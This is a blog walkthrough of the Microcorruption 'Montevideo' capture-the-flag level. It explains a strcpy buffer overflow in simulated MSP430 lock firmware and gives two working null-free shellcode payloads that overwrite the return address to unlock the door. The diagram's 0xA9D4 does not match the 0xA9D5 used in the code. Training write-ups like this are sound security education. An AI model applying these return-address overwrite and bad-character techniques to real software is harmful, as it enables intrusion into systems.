---
title: "Microcorruption - Montevideo"
date: 2019-02-18
categories: [microcorruption, reverse engineering]
tags: [microcorruption, tutorial, assembly, ctf, montevideo, walkthrough, debug, buffer overflow, shellcode]
description: Microcorruption Montevideo level explained in detail. We will see how to solve the level and understand the underlying concepts. 
hasComments: true
image: /images/microcorruption-levels-image.png
---

In this new level, just like the previous one, we will exploit a buffer overflow vulnerability and create a working shellcode in order to solve the level, only this time our shellcode will be limited. Keep reading to learn more :)

When you enter the level, as always, there is a pop up manual. The last paragraph states the following:
> This is Software Revision 03. We have received unconfirmed reports
    of issues with the previous series of locks. We have reimplemented
    much  of the  code according  to our  internal Secure  Development
    Process

Turns out they "reimplemented much of the code" following their *<red>Secure Development Process</red>*. Well, let us find out how reliable that process is and, of course, how can we break it. 

Inspecting `main` function you'll notice it simply calls `<login>` function, allocated at `0x44f4`. *<gold>(Please remember your addresses may be different)</gold>*

Allrighty then, let's see what `login` actually does.
```
44f4 <login>
44f4:  3150 f0ff      add	#0xfff0, sp
44f8:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
44fc:  b012 b045      call	#0x45b0 <puts>
4500:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4504:  b012 b045      call	#0x45b0 <puts>
4508:  3e40 3000      mov	#0x30, r14
450c:  3f40 0024      mov	#0x2400, r15
4510:  b012 a045      call	#0x45a0 <getsn>
4514:  3e40 0024      mov	#0x2400, r14
4518:  0f41           mov	sp, r15
451a:  b012 dc45      call	#0x45dc <strcpy>
451e:  3d40 6400      mov	#0x64, r13
4522:  0e43           clr	r14
4524:  3f40 0024      mov	#0x2400, r15
4528:  b012 f045      call	#0x45f0 <memset>
452c:  0f41           mov	sp, r15
452e:  b012 4644      call	#0x4446 <conditional_unlock_door>
4532:  0f93           tst	r15
4534:  0324           jz	#0x453c <login+0x48>
4536:  3f40 c544      mov	#0x44c5 "Access granted.", r15
453a:  023c           jmp	#0x4540 <login+0x4c>
453c:  3f40 d544      mov	#0x44d5 "That password is not correct.", r15
4540:  b012 b045      call	#0x45b0 <puts>
4544:  3150 1000      add	#0x10, sp
4548:  3041           ret
```

At a first glance there are some functions that catch my eye: 
- At address `0x4510` there is `getsn` which receives `0x30` (via `r14`) and `0x2400` (via `r15`) as parameters. 
- At address `0x451a` there is `strcyp` which receives `0x2400` (via `r14`) and `sp`'s *<orange>(Stack Pointer)</orange>* value at that particular moment (via `r15`) as parameters.
- At address `0x4528` there is `memset` which receives `NULL byte` (via `clr r14`) and `0x2400` (via `r15`) as parameters.
- Finally, at address `0x452e` there is `conditional_unlock_door`. 

Based on this information, what we can deduce so far is:
1. Our buffer is 48 (0x30) bytes long.
2. Our buffer first gets stored at address `0x2400`.
3. It then gets copied to whatever `sp` *<orange>(Stack Pointer)</orange>* value is at that particular point of execution.
4. The original copy at `0x2400` gets zeroed by `memset`.

Let's confirm that behavior and correct our assumptions. I suggest placing breakpoints right after each important function. 

<p align="center">
<img src="/images/microcorruption-montevideo0.png">
</p>

Before executing the program, I also suggest you to track `r15` is order to see it's value into Live Memory Dump window. In order to track a register you must simply execute `track rN` command, where N is the register number. In this particular case it'd be `track r15`.

When we're asked to input data, as always, we'll provide some easily recognizable bytes. In my case, I provided 50 bytes. You can copy your input from here:

ASCII: 
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
HEX: 
```
4141414141414141414142424242424242424242434343434343434343434444444444444444444445454545454545454545
```

<p align="center">
<img src="/images/microcorruption-montevideo1.png">
</p>

Our first assumptions were right since there are only 48 bytes (you can count how many Es are there and you'll count up to 8) at address `0x2400`.

<p align="center">
<img src="/images/microcorruption-montevideo2.png">
</p>

Right when `strcpy` finishes, we can inspect `r15`'s value.

<p align="center">
<img src="/images/microcorruption-montevideo3.png">
<img src="/images/microcorruption-montevideo4.png">
</p>

And we can, in fact, inspect the memory via Live Memory Dump window and see that our buffer got indeed copied at address `0x43ee`.

<p align="center">
<img src="/images/microcorruption-montevideo5.png">
</p>

Then address `0x2400` gets zeroed and if you continue the execution you'll get "That password is not correct" and the program will either finish expectedly or crash.

Interesting, what ought we do now? Well, let's keep breakpointing the code and acquire more knowledge about what it does. Interestingly enough, last two instructions of `login` function are:
```
4544:  3150 1000      add	#0x10, sp
4548:  3041           ret
```
Let's breakpoint on both of them and see what happens at execution time. 

<p align="center">
<img src="/images/microcorruption-montevideo6.png">
</p>

Once again, I recommend you to provide a full-length input. That is, 48 or more bytes.
<p align="center">
<img src="/images/microcorruption-montevideo7.png">
<img src="/images/microcorruption-montevideo8.png">
</p>

You will notice `sp`'s value right before adding `0x10` is `0x43ee`. Isn't `0x43ee` familiar? Well, it indeed is. `0x43ee` is where our input gets stored after `strcpy` does it job. This means `sp` will point to `0x43fe` when `ret` instruction is about to get executed, right when `login` is about to finish. And that means **we can control return address of `login` function** because the buffer is 48 (0x30) bytes long starting at address `0x43ee`. That's nice!

<p align="center">
<img src="/images/microcorruption-montevideo9.png">
<img src="/images/microcorruption-montevideo10.png">
</p>

As we've seen in previous levels, this allows us to jump wherever we want when `login` function ends. But, **<gold>Where do we actually want to jump?</gold>**. Just like the last level, [Whitehorse](/microcorruption/whitehorse), we will have to write our own **<red>Shellcode</red>** but this time with some limitations. Let's move to solution section and learn how we can actually achieve a working input :)

### Solution

The first thing to have in mind is the function we're exploiting, the vulnerable function. In this case, it is `strcpy`. `strcpy` defines our exploiting context and it has, of course, some limitations. Let's read some official documentation about [strcpy()](http://www.cplusplus.com/reference/cstring/strcpy/):

> Copies the C string pointed by source into the array pointed by destination, including the terminating null character **<red>(and stopping at that point)</red>**

Those very last words are very important to us because they basically tell us **how to NOT** write our shellcode. That is, `0x00` is a badchar in this context since `strcpy` will stop copying from there on. A badchar, or badchar, is a character, or set of characters, that, given a vulnerable function, a context, renders the shellcode useless. You can read more about badchars all over the Internet. [This one](https://www.ihacklabs.com/en/poc-badchar-alternative-method/) and [this one](https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/) are mere examples.

Now, keeping in mind badchars, let's design our shellcode. **<yellow>There are many solutions for this level</yellow>** and many variations of every solution, your imagination is the only limit. 

One solution that I implemented is very simple. We design such a payload whose length is lesser than 16 bytes (0x10) and then we jump to it. That is, we overwrite `login` return address with `0x43ee` address. Now, **<blue>what shall our shellcode do?</blue>** We can take advantage of code that already exists in the program's memory. 

As we've seen in previous levels, [LockitAll User Manual](https://microcorruption.com/manual.pdf) tells us how to achieve insta-unlock. That is, pushing **0x7F** into the stack and calling **INT**. `INT` function is at address `0x454c`.

```
454c <INT>
454c:  1e41 0200      mov	0x2(sp), r14
4550:  0212           push	sr
4552:  0f4e           mov	r14, r15
4554:  8f10           swpb	r15
4556:  024f           mov	r15, sr
4558:  32d0 0080      bis	#0x8000, sr
455c:  b012 1000      call	#0x10
4560:  3241           pop	sr
4562:  3041           ret
```

Well, what if we simply try the last level's solution. That is, pushing `0x7f` and calling `INT`.
```
push #0x7f
call #454c
```

Once again, we can assemble our code using [Microcorruption Assembler](https://microcorruption.com/assembler). As you can see in the image below, I underlined the NULL byte that'll make our shellcode useless. 

<p align="center">
<img src="/images/microcorruption-montevideo12.png">
</p>

The NULL byte is automatically inserted because MSP-430 works with 2 bytes addressing. In 2 bytes length, 0x7f is the same as 0x007f. It's exactly the same number. <purple>In fact, it doesn't matter how many padding zeros you use, it still remains the same number.</purple> MSP-430 compiler, or rather assembler, automatically fills with 0, padding up to 2 byte size every single integer and, by the other hand, it discards every byte but the last 2, the 2 LSB (Least Significant Byte). The following image can help us understand this behavior.

<p align="center">
<img src="/images/microcorruption-montevideo13.png">
</p>

Note `3012` are the constant opcodes for `push` instruction. Now notice how: ***(Remember MSP-430 uses Little Endian byte ordering scheme)***
1. Both integers <blue>#0x41</blue> and <blue>#0x0041</blue> became <orange>4100</orange>.
2. Integer <blue>#0x4100</blue> became <orange>0041</orange>.
3. Integer <blue>#0x414243</blue> became <orange>4342</orange>. (Only the 2 LSB are kept)


Now, in order to get rid of NULL bytes there are thousands of solutions and alternatives. What I suggest is very simple. That is, using basic arithmetic operations. Remember we are assembling instructions, we can do *whatever* we want as long as syntax is correct. Now, what if we take advantage of <yellow>registers</yellow>?. 

Let's say we place some value that has no NULL bytes in some register and then perform some arithmetic operation that has no NULL bytes on it so that the result is what we want. Since that result will be stored in a register, <red>it doesn't bother us whether it has NULL bytes</red>. We can then push that register's value. The following example is clarifying.

```
mov #0x0180, r15
sub #0x0101, r15
push r15
call #0x454c
```

Notice how `0x0180` - `0x0101` = `0x007f` and that's exactly what we want. *(Remember 0x007f is the same as 0x7f)* Of course there are many different ways of achieving the wanted value. 

The assembled code is: 
`3f4080013f8001010f12b0124c45`

<p align="center">
<img src="/images/microcorruption-montevideo14.png">
</p>

Now, remember there are 16 (0x10) bytes from the beginning of the buffer until return address and our assembled shellcode is only 14 bytes long. We will have to add <blue>2 padding bytes</blue> and then the <red>return address</red>, which will be the begging of the buffer so after `login` finishes, `ip` *<purple>(Instruction Pointer)</purple>* jumps right to our shellcode and executes it. 

So, the solving input (hex encoded) will be: **<orange>3f4080013f8001010f12b0124c45</orange><blue>4141</blue><red>ee43</red>** **<yellow>(One possible solution)</yellow>**

<p align="center">
<img src="/images/microcorruption-montevideo15.png">
</p>

<p align="center">
<img src="/images/microcorruption-montevideo16.png">
</p>

You could as well use 2 bytes *integer overflow* properties. That is, adding two big numbers (2 bytes long) so that the result exceeds 2 bytes size but the last 16 bits (2 bytes) represent 0x7f. Let's see the following example which will definitely help us understand this concept. 

```
mov #0x56AA, r12
add #0xA9D5, r12
push r12
call #0x454c
```

This code actually works. Let's assemble it, try it and explain why it does work.

<p align="center">
<img src="/images/microcorruption-montevideo17.png">
</p>

The working input (hex encoded) is: **<orange>3c40aa563c50d5a90c12b0124c45</orange><blue>4141</blue><red>ee43</red>** **<yellow>(Another possible solution, this time based on integer overflow)</yellow>**

<p align="center">
<img src="/images/microcorruption-montevideo18.png">
</p>

<p align="center">
<img src="/images/microcorruption-montevideo19.png">
</p>

It works because the result is bigger than the <blue>max value of a 2 bytes integer</blue> and only the last 16 bits are kept. That is, the rest are <purple>discarded</purple>. It is easier to understand what is happening if we think about binary representation and what is actually happening with the involved bits. The binary sum is as follows: *(I'm splitting bits 4 by 4 just for visualization sake)*

```
		    0 1 0 1   0 1 1 0   1 0 1 0   1 0 1 0 (0x56AA)
	+
		    1 0 1 0   1 0 0 1   1 1 0 1   0 1 0 1 (0xA9D4)
	_______________________________________________________
		1 | 0 0 0 0   0 0 0 0   0 1 1 1   1 1 1 1 (0x1007f) 

```
The result is `0x1007f` but since the length of integers is 2 bytes, only the last 16 bits count. <green>The last 16 bits are the binary representation of</green> `0x7f`. Notice how despite the result, no operand contains null bytes. Thats how we avoid badchars using integer overflow ***<red>(unsigned)</red>***. :)

## Recap

We've seen how `strcpy` is vulnerable to Buffer Overflow attacks. Exploiting such vulnerability we can change the program's execution flow in order to execute our shellcode. At the same time, `strcpy` limits our shellcode since there are some characters that make it useless, the so called badchars. There are many ways of avoiding badchars, we've seen one of the most simple. That is, basic arithmetic operations. Once badchars are avoided ***<yellow>(NULL-free shellcode)</yellow>***, we simply overwrite return address of `login` function so the `ip` jumps right to our shellcode. 

## More levels
* Click [here](/microcorruption/johannesburg) to see next level (Johannesburg).
* Click [here](/microcorruption/whitehorse) to see previous level (Whitehorse).
* Click [here](/microcorruption) to see levels index.